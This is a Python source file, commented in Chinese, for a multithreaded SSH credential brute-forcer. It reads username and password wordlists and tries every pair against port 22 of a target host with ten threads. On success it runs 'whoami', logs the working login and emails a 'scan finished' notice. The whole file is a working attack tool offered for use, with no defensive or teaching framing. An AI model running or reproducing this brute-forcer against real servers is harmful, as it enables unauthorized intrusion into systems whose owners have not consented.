#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
os.environ['PYTHONWARNINGS'] = 'ignore::DeprecationWarning'
import warnings
from cryptography.utils import CryptographyDeprecationWarning

warnings.filterwarnings("ignore", category=CryptographyDeprecationWarning)

import paramiko
import sys
import smtplib
import socket
import configparser
import datetime
import time
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.header import Header
from pathlib import Path
import logging
import threading
from queue import Queue
from multiprocessing import Value

# 设置日志
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# 禁用 paramiko 的日志
logging.getLogger("paramiko").setLevel(logging.CRITICAL)

# 程序banner
BANNER = """
SSH连接工具
版本: 2.0
时间: 2024/7/23
"""

def check_config_file():
    if not Path('config.ini').exists():
        logging.warning("未找到 config.ini 文件。邮件通知功能将不可用。")

def get_config(section, key):
    """从配置文件中读取配置"""
    config = configparser.ConfigParser()
    config_path = Path('config.ini')
    if not config_path.exists():
        raise FileNotFoundError(f"未找到配置文件: {config_path}")
    config.read(config_path)
    return config.get(section, key)

def ssh_connect(hostname, port, username, password):
    """建立SSH连接"""
    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh_client.connect(hostname, port=port, username=username, password=password, timeout=5)
        return ssh_client
    except Exception:
        return None

def worker(hostname, q, success_event, attempt_count):
    while not q.empty() and not success_event.is_set():
        username, password = q.get()
        with attempt_count.get_lock():
            attempt_count.value += 1
        ssh_client = ssh_connect(hostname, 22, username, password)
        if ssh_client:
            stdin, stdout, stderr = ssh_client.exec_command('whoami', timeout=5)
            print(stdout.read().decode('utf-8'))
            ssh_client.close()
            logging.info(f"连接成功！用户名: {username}, 密码: {password}")
            logging.info(f"在成功之前失败了 {attempt_count.value - 1} 次")
            success_event.set()
        q.task_done()

def ssh_client_connection(hostname):
    """尝试SSH客户端连接"""
    with open("username.txt", 'r') as f:
        usernames = f.read().splitlines()
    with open("password.txt", 'r') as f:
        passwords = f.read().splitlines()

    q = Queue()
    for username in usernames:
        for password in passwords:
            q.put((username, password))

    success_event = threading.Event()
    attempt_count = Value('i', 0)
    threads = []
    for _ in range(10):  # 使用10个线程
        t = threading.Thread(target=worker, args=(hostname, q, success_event, attempt_count))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    if not success_event.is_set():
        logging.warning(f"所有组合都已尝试，连接失败。总共失败 {attempt_count.value} 次")

    return success_event.is_set()

def send_msg():
    """发送邮件通知"""
    try:
        smtp_config = {
            'server': get_config("smtp", "server"),
            'port': int(get_config("smtp", "port")),
            'use_tls': get_config("smtp", "use_tls").lower() == 'true',
            'sender': get_config("smtp", "sender"),
            'password': get_config("smtp", "password"),
            'receivers': get_config("smtp", "receivers").split(',')
        }
        
        machine_name = socket.gethostname()

        msg_root = MIMEMultipart('mixed')
        msg_root['From'] = Header(f'{machine_name} <{smtp_config["sender"]}>')
        msg_root['To'] = Header(', '.join(smtp_config['receivers']))
        msg_root['Subject'] = Header(f'来自 {machine_name} 的消息', 'utf-8')
        
        mail_msg = f"""
        <html>
          <body>
          <p>[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}]<br>
             来自 {machine_name} 的消息</p>
        <p>路径: {os.getcwd()}<br>
           参数: {' '.join(sys.argv)}</p>
           您的扫描任务已经完成。
        </body>
        </html>"""

        msg_root.attach(MIMEText(mail_msg, 'html', 'utf-8'))

        if smtp_config['use_tls']:
            smtp = smtplib.SMTP(smtp_config['server'], smtp_config['port'])
            smtp.starttls()
        else:
            smtp = smtplib.SMTP_SSL(smtp_config['server'], smtp_config['port'])
        
        smtp.login(smtp_config['sender'], smtp_config['password'])
        smtp.sendmail(smtp_config['sender'], smtp_config['receivers'], msg_root.as_string())
        smtp.quit()
        logging.info("邮件发送成功")
    except FileNotFoundError:
        logging.warning("未找到配置文件 config.ini，跳过邮件发送")
    except Exception as e:
        logging.error(f"邮件发送失败: {e}")

def main():
    """主函数"""
    print(BANNER)

    if len(sys.argv) not in [2, 3]:
        print("用法: python script.py [-C] <hostname>")
        sys.exit(1)

    if len(sys.argv) == 2:
        hostname = sys.argv[1]
    else:
        if sys.argv[1] != '-C':
            print("无效的参数。使用 -C 或直接输入主机名。")
            sys.exit(1)
        hostname = sys.argv[2]

    try:
        success = ssh_client_connection(hostname)
        if success:
            send_msg()
        else:
            logging.warning("操作失败。请检查您的输入和配置。")
    except Exception as e:
        logging.error(f"发生错误: {e}")
    finally:
        logging.info("操作完成。如果需要发送邮件通知，请确保 config.ini 文件存在并配置正确。")

if __name__ == '__main__':
    check_config_file()
    main()
